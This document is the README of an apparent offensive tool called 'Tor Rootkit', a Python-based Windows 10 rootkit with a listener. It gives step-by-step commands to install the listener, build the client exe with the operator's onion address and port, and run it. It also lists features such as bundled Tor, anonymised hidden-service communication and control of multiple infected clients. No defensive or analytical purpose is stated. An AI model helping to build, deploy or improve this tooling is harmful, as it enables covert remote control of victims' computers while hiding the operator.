# Tor Rootkit
A python3 standalone Windows 10 Rootkit. The networking works over tor hidden services.
The exe Rootkit-File contains the tor expert bundle, so no staged payload is needed.

## Installation
First clone the git repository and change directory into the repo.

### Listener
Install all dependencies:
```bash
pip3 install -r listener/requirements.txt
```

After that the listener can be run with:
```bash
python3 listener/listener.py <listen-port> <forward-port>
```
Or:
```bash
./listener/listener.py <listen-port> <forward-port>
```

### Client
Note: The compilation of the Rootkit client ONLY works on Windows.

Install all dependencies:
```bash
pip3 install -r client\requirements.txt
```
Once the dependencies are installed you can build the executable file:
(Call build.py with the onion address and port of the listener.)
```bash
python client\build.py <onion> <port>
```
The .exe file should now be at:
```bash
.\client\dist\client.exe
```
Tor run the client just execute client.exe:
```bash
.\client.exe
```
Or run the client with the python interpreter:
```bash
python client.py
```

## Features
- Standalone executable, including python interpreter and tor expert bundle (~13MB)
- the whole communication works over tor hidden services which guarantees some degree of anonymity
- Listener can handle multiple clients
